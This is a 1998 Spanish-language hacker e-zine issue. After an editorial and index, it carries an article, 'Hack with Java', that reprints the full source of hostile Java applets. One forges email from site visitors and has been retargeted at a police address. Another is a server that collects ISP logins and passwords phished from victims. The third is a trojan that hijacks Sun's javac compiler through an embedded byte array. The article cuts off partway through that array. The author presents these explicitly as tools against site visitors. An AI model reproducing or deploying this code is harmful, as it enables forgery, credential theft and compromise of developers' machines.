                   
               
                        …ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒª
                        ≥                  ⁄ƒƒƒƒƒƒø  ≥
                        ≥                  ≥€€€€€€≥  ≥
                        ≥           ⁄ƒƒƒƒƒƒ¥€€⁄ƒƒƒŸ  ≥
                        ≥    ⁄ƒƒƒƒƒƒ¥€€€€€€≥€€¿ƒø    ≥
                        ≥    ≥€€€€€€√ƒø€€⁄ƒ¥€€€€≥    ≥
                        ≥    ¿ƒø€€⁄ƒ¡ø≥€€≥J≥€€⁄ƒŸ    ≥
                        ≥  ⁄ƒƒø≥€€≥€€¿Ÿ€€≥J≥€€≥      ≥  
                        ≥  ≥€€¿Ÿ€€≥€€€€€€≥F√ƒƒŸ      ≥  
                        ≥  ≥€€€€€€√ƒƒƒƒƒƒ¡ƒŸ         ≥  
                        ≥  ¿ƒƒƒƒƒƒŸ                  ≥  
                        ≥   H A C K E R S  T E A M   ≥  
                        ≥       J O U R N A L        ≥  
                        Ãƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒπ        
                        ≥     VOL. #1, Nß4, 1998.    ≥ 
                        »ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒº


                  THE HACKERS ARE COMMING TO SAVE THE EARTH. 


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=          

     Nota: - J.J.F. / HACKERS TEAM - no se hace responsable del mal uso
           de la informacion aqui expuesta y tampoco tiene que estar
           de acuerdo con lo que sus colaboradores opinen.
           Tampoco esperamos que la gente use la informacion aqui expuesta
           para hacer da§o ya que tan solo es con fines didacticos.
 
     Recomendado el uso del editor del MS-DOS.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=          

     #CURRENT MEMBERS :

     - CONDE VAMPIRO     - CODER  H/P/V  EDITOR
     - MAC CRACK BISHOP  - CODER  C/P    WEBMASTER
     
     #WEB OFICIAL :

     - http://www.angelfire.com/mi/JJFHackers
     - http://jjfhackers.home.ml.org

     #E-MAIL OFICIAL :

     - jjf_team@usa.net      

     #DISTRIBUIDORES OFICIALES DEL E-ZINE :

     - http://wakanda.islatortuga.com
     - http://underhack.islatortuga.com
     - http://personal.redestb.es/cheroky-1 
     - http://members.xoom.com/baron_rojo/

     #MIEMBRO OFICIAL (web ring) DE :

     - Black Angels
     - Spanish Underground Web Ring

     #COLABORADORES CON ESTE NUMERO :

     - Daemon
     - Nobody
     - DrSlump (OiOiO's Band)
     - Bisho
     - Silicon Dragon

     #SALUDOS :

     - Metalslug (Wakanda)
     - Schoddy Guy (Underhack)
     - Cheroky
     - Silicon Dragon

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  - INDICE.                                  

    TITULO                                        AUTOR
  ƒƒƒƒƒƒƒƒƒƒƒƒ\_______________________________/ƒƒƒƒƒƒƒƒƒƒƒƒ

  * EDITORIAL ................................ J.J.F. / HACKERS TEAM
  * HACK WITH JAVA ........................... NOBODY.
  * UN POKILLO DE PHREAKING .................. DRSLUMP.    
  * CURSO DE HACK IV ......................... CONDE VAMPIRO.
  * COMO HACKEAR UN TAMATGOTCHI .............. BISHO.
  * MANIFIESTO DE UN HACKER NOVATO ........... SILICON DRAGON.  
  * INTRODUCCION AL HACKING v2.0 II .......... DAEMON.
  * EL LECTOR OPINA .......................... VARIOS.
  * NOTICIAS UNDERGROUND ..................... J.J.F. / HACKERS TEAM

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  -------------
  ≥ EDITORIAL ≥
  -------------

        Bueno, parece mentira, ya estamos en el cuarto numero de este ezine, y
  por lo que podemos comprobar parece que esta gustando mucho a la comunidad
  underground y eso nos alegra mucho y nos anima a seguir pero por supuesto
  nos teneis que ayudar enviando articulos o cualquier cosa que pienses que
  puede servir para este ezine. Ya hemos superado el numero de algunas
  publicaciones underground antiguas y esto nos sorprende pero esta claro
  que pensamos editar muchos mas numeros y crear algo que valga la pena
  para los hackers hispanos.

        Sinceramente, cuando empezamos con este proyecto hace ya unos 6 meses,
  no pensabamos que conseguiria abrirse un hueco como lo esta haciendo,
  incluso aquellas lejanas voces que nos criticaban por esta supuesta locura,
  han desaparecido, demostrando que estaban equivocados al no darnos una
  oportunidad al empezar. Como es bien sabido, siempre es mas facil criticar,
  que ayudar.

        Nos gustaria que los hackers hispanos nos ayudeis en la elaboracion de
  este ezine enviando vuestros articulos o actos de hack, con lo que
  consiguiremos una revista autenticamente hispana y nos olvidaremos de los
  topicos americanos, que estan demasiados vistos, ademas cuando es bien
  sabido que en el underground hispano hay magnificos hackers.

        Os queremos comentar que la seccion EL LECTOR OPINA, parece que
  funciona muy bien, ya que recibismos muchas cartas de los lectores, pero
  como sabeis nos gustaria que fuese mas dinamica esta seccion, esto se
  consiguiria si fueseis los propios lectores que os contestaises entre
  vosotros, nosotros os ponemos los medios y os ayudamos cuando sea
  necesario ;-)

        Destacar que en este numero del ezine, en la seccion de NOTICIAS
  UNDERGROUND os hemos preparado una serie de articulos dedicados a los
  hackers que recientemente entraron en el Pentagono, y que estamos seguros
  que os gustaran mucho. Tambien decir que a partir de ahora contamos con
  mas distribuidores oficiales, como el web de Cheroky y el de Silicon Dragon.
  O sea que ahora no teneis excusa para decir que no podeis encontrar este
  ezine ;-)

        Por algun extra§o misterio que no comprendemos, muchos de nuestros
  lectores nos siguen enviado mail a la direccion antigua, ya en el numero 3
  os avisamos que hemos cambiado de direccion de correo, por lo que a partir
  de ahora los mail's que sean enviados a la direccion antigua no seran
  contestados. Por eso apuntaros la nueva o pasaros por el web, ya que
  siempre estaras a la ultima de cualquier cambio en - J.J.F. / HACKERS
  TEAM -.

        Nos gustaria deciros que si teneis un link a nuestro web o quereis
  colaborar de alguna forma con el ezine, solo nos teneis que enviar un
  mail informandonos de ello, por ejemplo si quereis ser distribuidores
  oficiales, quereis pasar el ezine a otro formato, llevar una seccion en
  el ezine, etc...  Ya corto con el tipico rollo y que empieze el ezine, pero
  no antes sin decirte que si quieres enviar un articulo, actos de hacking,
  sugerencias, propuestas o criticas, escribe a la siguiente direccion:

  jjf_team@usa.net

                                                   - J.J.F. / HACKERS TEAM -

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
                                                                   27-02-1998.
                                                                     ??????

                              € € € € € € € € €
                                HACK WITH JAVA €
                           ƒƒƒ€ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
                                  by NOBODY    €
                              € € € € € € € € €

()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()

  Nota Del Autor: No me hago responsable de la mala utilizacion de la
                  informacion aqui expuesta ya que tan solo es para fines
                  didacticos. Por lo que se ruega cuidado al usar el
                  material sensible de este articulo.

()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()

        Quien no a oido hablar de Java o como minimo haberlo visto en una web,
  como por ejemplo esas fantasticas animaciones o esos curiosos botones?? Ese
  supuesto lenguaje que tenia que ser universal y seguro, solo que como
  suele pasar la teoria es mas bonita que la practica, y en este caso no 
  podia ser para menos.

        Para quien no se acuerde de Java o no sepa nada, explicaremos un poco
  su mecanismo. Java es un lenguaje de caracter general creado por James
  Gosling e introducido por Sun Microsystems, el cual se puede ejecutar en
  cualquier plataforma, por ejemplo, podemos escribir un programa en un pc
  corriendo Win y despues pasarlo a un Sparc sin ningun problema. Esto es
  debido a la compilacion de Java que es diferente que los demas lenguajes.
  Cuando compilamos en Java (el fichero *.java, que es el fuente) este pasa a
  un formato en binario *.class (lo que se conoce como Bytecode) y despues
  tiene que ser leido por la maquina virtual java que tiene que estar en la
  plataforma que querramos usar el programa, practicamente hoy en dia en
  todas las plataformas hay maquinas virtuales java.

        Digamos que Java presenta 2 tipos principales de peligros, el primero
  seria usar applets o programas en java en nuestro ordenador sin saber de
  donde vienen, logicamente hay medidas de seguridad contra esto pero se
  pueden evitar ;-) y el segundo tipo sera la que nos interesa en este
  articulo y que paso a describir con mas profundidad.

        Este 2 grupo al que me refiero seria cuando conectamos a un web con
  applets de java, ya que hay varios tipos de ataques que podemos sufrir o
  en nuestro caso usar para nuestro hacking. Este tipo de ataques los
  podemos dividir en 4 categorias. Que serian estas:

  1- Modificacion del sistema.
  2- Invadir la privacidad.
  3- Denegacion de servicios (DoS).
  4- Molestos.

  1- Modificacion del sistema.

        Este ataque seria cuando un usuario conecta a un web donde haya un
  applet de java y este le modifique su ordenador sin que el usuario se
  percate de nada. Logicamente esto es muy util si queremos controlar el
  ordenador de nuestra victima.

        Este codigo en java es muy divertido, ya que cuando una persona visite
  nuestro web, el applet de java enviara un mail suyo al G.D.I. (Grupo de
  Delincuencia Informatica de la Guardia Civil, peque§o ajuste que le he
  hecho al codigo }:-) y lo mejor es que la victima ni se enterra.

------------ Codigo Fuente ---------------------------------------------------

/* Forger.java by Mark D. LaDue */

/* March 15, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/*  This hostile applet forges an elctronic mail letter from the person who
    views the applet in a browser to the person whose address appears in the
    string "toMe."  The return address will be listed as HostileApplets@
    followed by the string "mailFrom."  The appropriate commands to use for
    sendmail can be often be found in the file /etc/mail/sendmail.hf.  
    Note that while the person viewing the applet actually does initiate
    the mail by connecting (involuntarily) to port 25, the applet host's role
    in sending it is not so easily hidden.  See the full header of any e-mail
    letter sent by the applet for more details. */ 

import java.applet.*;
import java.io.*;
import java.net.*;

public class Forger extends java.applet.Applet implements Runnable { 

    public static Socket socker;
    public static DataInputStream inner;
    public static PrintStream outer;
    public static int mailPort = 25 ;
    public static String mailFrom = "guardiacivil.org";
    public static String toMe = "gc.uco@mad.servicom.es";
    public static String starter = new String();
    Thread controller = null;

    public void init() {

	try {
	    socker = new Socket(getDocumentBase().getHost(), mailPort);
	    inner = new DataInputStream(socker.getInputStream());
	    outer = new PrintStream(socker.getOutputStream());
        }
        catch (IOException ioe) {}
    }

    public void start() {
        if (controller == null) {
            controller = new Thread(this);
            controller.setPriority(Thread.MAX_PRIORITY);
            controller.start();
        }
    }

    public void stop() {
        if (controller != null) {
            controller.stop();
            controller = null;
        }
    }

    public void run() {
        try {
            starter = inner.readLine();
        }
        catch (IOException ioe) {}
        mailMe("HELO " + mailFrom);
        mailMe("MAIL FROM: " + "HostileApplets@" + mailFrom);
	mailMe("RCPT TO: " + toMe);
	mailMe("DATA");
        mailMe("Subject: About PenPal.java" + "\n" +"Hi Venkat,"  + 
           "\n" + "\n" + 
           "Thanks for taking a look at PenPal.java.  From your note\n" +
           "I think I can understand why you're not seeing the desired\n" +
           "result.  My guess is that perhaps you're only looking at\n" +
           "an abbreviated header from an e-mail note that the applet\n" +
           "forges.  In order to get the whole story, you have to\n" +
           "inspect the full header.  That's where you'll be able to\n" +
           "discern more information about the *sender*.  Of course\n" +
           "that's exactly what my shell script retrieves from\n" +
           "/var/mail/mladue.  None of this is apparent from the\n" +
           "source code, and indeed I noticed it quite by accident \n" +
           "when I was fiddling around trying to make my mail forging\n" + 
           "applet work.  Perhaps it's a peculiarity of the mail\n" +
           "system here in the School of Mathematics, but it really works\n" +
           "for me here.  So I hope that's what it is and that you'll\n" +
           "be able to reproduce my results there.\n" +
           "\n" + "Mark LaDue\n" + "mladue@math.gatech.edu\n" + "\n" +
           "\n" + "P.S. Of course one of my applets forged this note.\n" +
           "\n." + "\n"); 
        mailMe("QUIT");
        try {
            socker.close();
        }
        catch (IOException ioe) {}
    }

    public void mailMe(String toSend) {
        String response = new String();
        try {
            outer.println(toSend);
            outer.flush();
            response = inner.readLine();
        }
        catch(IOException e) {}
    }
}

------------ FIN -------------------------------------------------------------

        Este curioso applet nos sera de gran ayuda, ya que cuando un usuario
  vea nuestro web, el applet emulara un modo de servidor, con lo que
 podremos obtener informacion del ordenador de usuario. Este codigo acompa§a
 el applet llamado "Ungrateful.java", el cual esta mas abajo y asi podremos
 enga§ar al usuario y recibir su login y password de su ISP ;-)

------------ Codigo Fuente ---------------------------------------------------

/* LoginServerSocket.java by Mark D. LaDue */

/* February 28, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/*  This Java Application sets up a simple ServerSocket to receive
     data from the Java applet Ungrateful.java */

import java.applet.Applet;
import java.awt.*;
import java.io.*;
import java.net.*;

class LoginServerSocket {

    public static void main(String args[]) {

        ServerSocket server;
        Socket sock;
        InputStream inStream;
//      OutputStream outStream;
        String home = new String("www.math.gatech.edu");
        int port = 7000;
        byte b[] = new byte[128];
        int numbytes;
        String reply;

        if (args.length != 1) {
          System.out.println("Command: java LoginServerSocket <port number>");
          return;
        }

        System.out.println("LoginServerSocket Session Starting");

        port = Integer.parseInt(args[0]);

//    Create the ServerSocket
        try {
            server = new ServerSocket(port);
            }
        catch (IOException ioe) {
            System.out.println("Unable to open port " + port);
            return;
        }

//  Listen for anyone logging in to the applet
        while (true) {
            try {
                sock = server.accept();
                inStream = sock.getInputStream();
            }
            catch (IOException ioe) {
                System.out.println("Accept failed at port " + port);
                return;
            }
            try {
                numbytes = inStream.read(b, 0, 128);
            }
            catch (IOException ioe) {
                System.out.println("Read failed at port " + port);
                return;
            }
            reply = new String(b, 0, 0, numbytes);
            System.out.println("Host Name / IP Address \t" + 
                               "Login \t" + "Password");
            System.out.println(reply);

//  We could send a message back, but we won't right now
            try {
                sock.close();
            }
            catch (IOException ioe) {
                 System.out.println("Unable to close port " + port);
            }
        }
    }
}

------------ FIN -------------------------------------------------------------

        Este programa en java es una especie de virus en java, ya que se
  aprovecha de un fallo en los compiladores Java de Sun (unix). Cuando el
  programa Hijacker.java se ejecute, contaminara el compilador y cada vez
  que cree un fichero *.class saldra el mensaje de "Hijacked!", el programa
  puede ser facilmente modificado para que los efectos sean peores.

------------ Codigo Fuente ---------------------------------------------------

/* Hijacker.java by Mark D. LaDue */

/* January 6, 1997 */

/* Copyright (c) 1997 Mark D. LaDue
   You may study, use, modify, and distribute this example for any purpose.
   This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java application attacks Sun's Java compiler javac.  It takes
   advantage of the fact that Sun's javac is a shell script that searches
   for classes first in your CLASSPATH, then in $J_HOME/classes, and finally
   in $J_HOME/lib/classes.zip.  Thus if classes.zip doesn't happen to lie
   in your CLASSPATH, javac will look for Java classes in $J_HOME/classes
   before it uses classes.zip.  Hijacker.java takes advantage of this fact
   and creates a hostile $J_Home/classes/sun/tools/javac/Main.class, the main
   class of the compiler.  In this case, the hostile compiler simply
   announces its presence each time it is run and appends the string
   "Hijacked!" to every .class file that it produces.  Clearly the same
   could be done to any other Java classes, and a more sophisticated version
   could simply "patch" classes.zip, or even the Java Runtime, to achieve
   more dire efffects.  By itself a Trojan class like this is not too
   threatening, but as the payload of a Java Platform virus.... */

import java.io.*;

class Hijacker {
    public static void main (String[] argv) {
// The integer array containing a hacked Main.class
int[] hijacked = {
202,
254,
186,
190,
0,
3,
0,
45,
1,
109,
8,
1,
98,
8,
1,
99,
8,
1,
100,
8,
1,
48,
8,
1,
108,
8,
1,
104,
8,
1,
59,
8,
1,
60,
8,
1,
68,
8,
0,
217,
8,
0,
248,
8,
1,
90,
8,
1,
87,
8,
1,
18,
8,
1,
15,
8,
1,
64,
8,
0,
241,
8,
1,
69,
8,
1,
71,
8,
1,
38,
8,
0,
209,
8,
0,
212,
8,
1,
49,
8,
1,
102,
8,
1,
106,
8,
0,
230,
8,
1,
37,
8,
1,
27,
8,
1,
32,
8,
1,
65,
8,
1,
67,
8,
0,
253,
8,
1,
79,
8,
1,
78,
8,
1,
84,
8,
0,
202,
8,
0,
204,
8,
1,
34,
8,
1,
88,
7,
1,
45,
7,
0,
254,
7,
1,
74,
7,
1,
5,
7,
1,
1,
7,
0,
223,
7,
0,
252,
7,
0,
246,
7,
1,
47,
7,
0,
236,
7,
1,
0,
7,
1,
75,
7,
1,
95,
7,
0,
250,
7,
0,
231,
7,
0,
242,
7,
1,
43,
7,
1,
50,
7,
0,
255,
7,
0,
251,
7,
0,
249,
7,
1,
12,
7,
1,
10,
7,
1,
89,
7,
1,
16,
7,
1,
53,
10,
0,
40,
0,
140,
10,
0,
57,
0,
161,
10,
0,
40,
0,
193,
9,
0,
57,
0,
165,
10,
0,
45,
0,
143,
10,
0,
49,
0,
186,
10,
0,
46,
0,
154,
10,
0,
45,
0,
185,
10,
0,
61,
0,
194,
10,
0,
61,
0,
175,
10,
0,
50,
0,
138,
10,
0,
47,
0,
168,
10,
0,
61,
0,
167,
10,
0,
60,
0,
201,
10,
0,
43,
0,
166,
11,
0,
63,
0,
196,
11,
0,
63,
0,
182,
10,
0,
48,
0,
197,
10,
0,
61,
0,
160,
10,
0,
49,
0,
144,
10,
0,
60,
0,
149,
10,
0,
46,
0,
158,
10,
0,
45,
0,
197,
9,
0,
57,
0,
141,
10,
0,
58,
0,
177,
10,
0,
58,
0,
181,
10,
0,
61,
0,
146,
10,
0,
62,
0,
190,
10,
0,
57,
0,
142,
10,
0,
43,
0,
184,
10,
0,
62,
0,
200,
10,
0,
62,
0,
195,
10,
0,
58,
0,
187,
9,
0,
50,
0,
159,
10,
0,
41,
0,
168,
10,
0,
62,
0,
183,
9,
0,
50,
0,
171,
10,
0,
57,
0,
199,
9,
0,
50,
0,
169,
10,
0,
57,
0,
172,
10,
0,
43,
0,
191,
10,
0,
65,
0,
145,
10,
0,
45,
0,
192,
10,
0,
49,
0,
163,
10,
0,
50,
0,
157,
10,
0,
55,
0,
197,
10,
0,
50,
0,
148,
10,
0,
62,
0,
173,
10,
0,
48,
0,
162,
10,
0,
60,
0,
180,
10,
0,
60,
0,
150,
10,
0,
45,
0,
170,
10,
0,
62,
0,
198,
10,
0,
49,
0,
164,
10,
0,
62,
0,
168,
10,
0,
47,
0,
153,
10,
0,
48,
0,
152,
10,
0,
50,
0,
176,
10,
0,
54,
0,
186,
10,
0,
54,
0,
147,
10,
0,
50,
0,
179,
10,
0,
64,
0,
178,
10,
0,
54,
0,
192,
9,
0,
62,
0,
189,
10,
0,
56,
0,
174,
10,
0,
61,
0,
151,
10,
0,
51,
0,
188,
10,
0,
57,
0,
156,
9,
0,
43,
0,
139,
10,
0,
46,
0,
195,
10,
0,
48,
0,
155,
10,
0,
47,
0,
188,
12,
0,
206,
0,
213,
12,
0,
215,
0,
220,
12,
0,
229,
1,
80,
12,
1,
72,
1,
86,
12,
1,
54,
1,
30,
12,
1,
31,
0,
244,
12,
0,
208,
1,
83,
12,
1,
13,
1,
81,
12,
1,
96,
1,
83,
12,
0,
211,
0,
222,
12,
0,
221,
1,
7,
12,
1,
11,
1,
80,
12,
0,
218,
1,
41,
12,
1,
36,
1,
51,
12,
1,
23,
1,
52,
12,
0,
214,
1,
81,
12,
0,
210,
1,
80,
12,
1,
42,
1,
83,
12,
1,
39,
1,
81,
12,
0,
235,
1,
81,
12,
0,
243,
1,
107,
12,
1,
20,
1,
91,
12,
1,
19,
1,
9,
12,
0,
228,
1,
62,
12,
0,
240,
1,
7,
12,
1,
46,
1,
44,
12,
0,
234,
1,
14,
12,
0,
215,
1,
26,
12,
1,
24,
1,
82,
12,
0,
237,
1,
35,
12,
0,
243,
1,
30,
12,
1,
2,
1,
91,
12,
1,
31,
1,
73,
12,
1,
94,
1,
91,
12,
0,
218,
1,
30,
12,
0,
243,
0,
233,
12,
0,
228,
1,
4,
12,
0,
216,
1,
29,
12,
1,
22,
1,
101,
12,
0,
238,
1,
81,
12,
1,
6,
1,
30,
12,
0,
243,
1,
33,
12,
0,
218,
1,
63,
12,
1,
93,
1,
57,
12,
0,
203,
1,
80,
12,
0,
243,
1,
21,
12,
0,
239,
1,
3,
12,
1,
31,
0,
245,
12,
1,
70,
0,
222,
12,
0,
243,
1,
3,
12,
1,
25,
1,
3,
12,
1,
85,
1,
92,
12,
0,
205,
1,
80,
12,
1,
77,
0,
224,
12,
1,
56,
1,
76,
12,
0,
219,
1,
40,
12,
0,
247,
1,
29,
12,
0,
226,
1,
76,
12,
0,
225,
1,
40,
12,
0,
243,
1,
81,
12,
1,
55,
1,
80,
12,
0,
243,
1,
105,
12,
1,
97,
1,
76,
12,
1,
103,
1,
80,
1,
0,
37,
89,
111,
117,
114,
32,
74,
97,
118,
97,
32,
99,
111,
109,
112,
105,
108,
101,
114,
32,
104,
97,
115,
32,
98,
101,
101,
110,
32,
104,
105,
106,
97,
99,
107,
101,
100,
33,
1,
0,
15,
104,
97,
115,
77,
111,
114,
101,
69,
108,
101,
109,
101,
110,
116,
115,
1,
0,
11,
102,
97,
116,
97,
108,
46,
101,
114,
114,
111,
114,
1,
0,
6,
109,
107,
100,
105,
114,
115,
1,
0,
14,
108,
111,
97,
100,
68,
101,
102,
105,
110,
105,
116,
105,
111,
110,
1,
0,
15,
76,
105,
110,
101,
78,
117,
109,
98,
101,
114,
84,
97,
98,
108,
101,
1,
0,
9,
103,
101,
116,
83,
116,
97,
116,
117,
115,
1,
0,
18,
105,
110,
118,
97,
108,
105,
100,
32,
97,
114,
103,
117,
109,
101,
110,
116,
58,
32,
1,
0,
8,
105,
115,
90,
105,
112,
112,
101,
100,
1,
0,
12,
103,
101,
116,
81,
117,
97,
108,
105,
102,
105,
101,
114,
1,
0,
15,
106,
97,
118,
97,
46,
99,
108,
97,
115,
115,
46,
112,
97,
116,
104,
1,
0,
36,
40,
76,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
67,
108,
97,
115,
115,
68,
101,
99,
108,
97,
114,
97,
116,
105,
111,
110,
59,
41,
86,
1,
0,
5,
99,
108,
111,
115,
101,
1,
0,
3,
111,
117,
116,
1,
0,
10,
115,
116,
97,
114,
116,
115,
87,
105,
116,
104,
1,
0,
6,
45,
100,
101,
98,
117,
103,
1,
0,
5,
101,
114,
114,
111,
114,
1,
0,
9,
103,
101,
116,
83,
111,
117,
114,
99,
101,
1,
0,
21,
76,
106,
97,
118,
97,
47,
105,
111,
47,
80,
114,
105,
110,
116,
83,
116,
114,
101,
97,
109,
59,
1,
0,
10,
103,
101,
116,
67,
108,
97,
115,
115,
101,
115,
1,
0,
29,
40,
41,
76,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
73,
100,
101,
110,
116,
105,
102,
105,
101,
114,
59,
1,
0,
22,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
66,
117,
102,
102,
101,
114,
1,
0,
38,
40,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
41,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
1,
0,
11,
110,
101,
120,
116,
69,
108,
101,
109,
101,
110,
116,
1,
0,
7,
103,
101,
116,
80,
97,
116,
104,
1,
0,
9,
77,
97,
105,
110,
46,
106,
97,
118,
97,
1,
0,
7,
99,
111,
109,
112,
105,
108,
101,
1,
0,
8,
103,
101,
116,
69,
114,
114,
111,
114,
1,
0,
9,
91,
100,
111,
110,
101,
32,
105,
110,
32,
1,
0,
25,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
73,
100,
101,
110,
116,
105,
102,
105,
101,
114,
1,
0,
10,
69,
120,
99,
101,
112,
116,
105,
111,
110,
115,
1,
0,
39,
40,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
41,
86,
1,
0,
18,
103,
101,
116,
67,
108,
97,
115,
115,
68,
101,
102,
105,
110,
105,
116,
105,
111,
110,
1,
0,
11,
102,
108,
117,
115,
104,
69,
114,
114,
111,
114,
115,
1,
0,
31,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
67,
108,
97,
115,
115,
68,
101,
99,
108,
97,
114,
97,
116,
105,
111,
110,
1,
0,
7,
114,
101,
112,
108,
97,
99,
101,
1,
0,
5,
114,
101,
115,
101,
116,
1,
0,
4,
101,
120,
105,
116,
1,
0,
8,
101,
108,
101,
109,
101,
110,
116,
115,
1,
0,
8,
45,
110,
111,
119,
114,
105,
116,
101,
1,
0,
16,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
79,
98,
106,
101,
99,
116,
1,
0,
6,
60,
105,
110,
105,
116,
62,
1,
0,
27,
40,
74,
41,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
66,
117,
102,
102,
101,
114,
59,
1,
0,
27,
40,
73,
41,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
66,
117,
102,
102,
101,
114,
59,
1,
0,
24,
106,
97,
118,
97,
47,
105,
111,
47,
70,
105,
108,
101,
79,
117,
116,
112,
117,
116,
83,
116,
114,
101,
97,
109,
1,
0,
8,
101,
110,
100,
115,
87,
105,
116,
104,
1,
0,
9,
32,
119,
97,
114,
110,
105,
110,
103,
115,
1,
0,
26,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
69,
110,
118,
105,
114,
111,
110,
109,
101,
110,
116,
1,
0,
24,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
67,
111,
110,
115,
116,
97,
110,
116,
115,
1,
0,
29,
106,
97,
118,
97,
47,
105,
111,
47,
70,
105,
108,
101,
78,
111,
116,
70,
111,
117,
110,
100,
69,
120,
99,
101,
112,
116,
105,
111,
110,
1,
0,
24,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
67,
108,
97,
115,
115,
70,
105,
108,
101,
1,
0,
2,
58,
32,
1,
0,
24,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
67,
108,
97,
115,
115,
80,
97,
116,
104,
1,
0,
29,
106,
97,
118,
97,
47,
105,
111,
47,
66,
121,
116,
101,
65,
114,
114,
97,
121,
79,
117,
116,
112,
117,
116,
83,
116,
114,
101,
97,
109,
1,
0,
32,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
99,
47,
66,
97,
116,
99,
104,
69,
110,
118,
105,
114,
111,
110,
109,
101,
110,
116,
1,
0,
19,
106,
97,
118,
97,
47,
105,
111,
47,
73,
79,
69,
120,
99,
101,
112,
116,
105,
111,
110,
1,
0,
5,
102,
108,
97,
103,
115,
1,
0,
4,
40,
73,
41,
86,
1,
0,
53,
40,
76,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
69,
110,
118,
105,
114,
111,
110,
109,
101,
110,
116,
59,
76,
106,
97,
118,
97,
47,
105,
111,
47,
79,
117,
116,
112,
117,
116,
83,
116,
114,
101,
97,
109,
59,
41,
86,
1,
0,
16,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
121,
115,
116,
101,
109,
1,
0,
7,
112,
114,
105,
